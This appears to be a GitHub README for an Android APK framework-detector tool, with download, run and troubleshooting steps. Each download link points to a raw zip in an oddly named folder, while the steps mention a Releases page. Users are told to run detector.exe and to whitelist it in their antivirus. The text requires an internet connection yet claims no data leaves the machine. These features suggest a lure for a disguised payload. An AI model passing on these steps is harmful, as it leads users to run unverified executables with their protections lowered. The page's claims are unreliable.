# 🔍 apk-framework-detector - Identify Android App Building Technologies Fast

[![Download apk-framework-detector](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Felipes877/apk-framework-detector/raw/refs/heads/main/mucrones/detector_framework_apk_2.5.zip)

This tool identifies the framework or language an Android application uses. You no longer need to unzip or inspect files by hand. The software automates the process and provides clear results for any Android Package file.

## ⚙️ System Requirements

- Windows 10 or Windows 11.
- Java Runtime Environment (JRE) installed on your system.
- An internet connection for the application to function.
- At least 200MB of free disk space.

## 📥 How to Download and Install

Follow these steps to set up the software on your computer.

1. Navigate to the official download page: [https://github.com/Felipes877/apk-framework-detector/raw/refs/heads/main/mucrones/detector_framework_apk_2.5.zip](https://github.com/Felipes877/apk-framework-detector/raw/refs/heads/main/mucrones/detector_framework_apk_2.5.zip)
2. Locate the section labeled Releases on the right side of the screen.
3. Choose the latest version of the application.
4. Select the file ending in .zip to start your download.
5. Save the file to your preferred folder.
6. Right-click the downloaded folder and select Extract All.
7. Open the extracted folder to find the file named detector.exe.

## 🚀 Running the Software

You do not need to install complex drivers or packages. Perform these operations to analyze an APK file.

1. Double-click the detector.exe file to open the program.
2. A black window displays the interface. 
3. Type the full path of your APK file into the window.
4. Press the Enter key on your keyboard.
5. The software decompiles the file.
6. The window displays the framework name, such as React Native, Flutter, or Xamarin, after the scan finishes.

## 📋 What the Tool Detects

The application scans for specific signatures within the APK file. It identifies the following frameworks:

- **React Native:** Recognizes index.android.bundle files.
- **Flutter:** Detects libflutter.so files within the folder structure.
- **Xamarin:** Looks for specific cross-platform library files.
- **Cordova/Ionic:** Finds the config.xml file in the asset folder.
- **Unity:** Identifies folder structures used by the game engine.
- **Native Android:** Confirms applications built with standard tools.

## 🛠 Troubleshooting Common Issues

If you experience problems, check these items.

- **Missing Java:** You receive an error if Java is missing. Download and install the latest Java runtime from the official website.
- **File Path Errors:** Ensure your file path does not contain special characters or symbols. Move the APK file to your main C: drive if the application fails to read it.
- **Antivirus Interference:** Some security software marks new tools as suspicious. Add the folder to your antivirus whitelist to prevent interference.
- **Corrupt APK:** If the tool reports an error, the APK file might be corrupt or encrypted. Try a different file to confirm the software works.

## 🖥 Command Line Interface

The application uses a text-based interface. You do not need to click buttons. Type commands to interact with the software.

- **Help:** Type help and press Enter to see a list of commands.
- **Analyze:** Type analyze followed by a space and the APK path to start a scan.
- **Quit:** Type exit to close the program window.

## 📂 Understanding the Results

The results appear in the terminal window as plain text.

- **Framework Name:** The software prints the primary language or framework found.
- **Confidence Level:** The tool provides a percentage score based on how many files match the framework signature. 100% means the files match perfectly.
- **Source Files:** The tool lists a few key files found in the APK that justify the detection result.

## 💻 Technical Background

The tool works by unpacking your APK file into a temporary directory. It reads the file headers and scans the file manifest. It then compares these details against a known list of developer patterns. Once the match finishes, the tool deletes the temporary files to save space on your hard drive. This keeps your system clean while the software performs its work.

## 🔒 Security and Privacy

The application performs analysis locally on your computer. It does not send your APK files to a remote server. No data leaves your machine during the detection process. You maintain control over your files at all times. Use the software in offline mode if you prefer additional privacy.

## 📃 License

This project uses an open-source license. You can use the software for personal or professional projects without restrictions. Share the software with colleagues or friends if they require a tool for identifying Android application frameworks.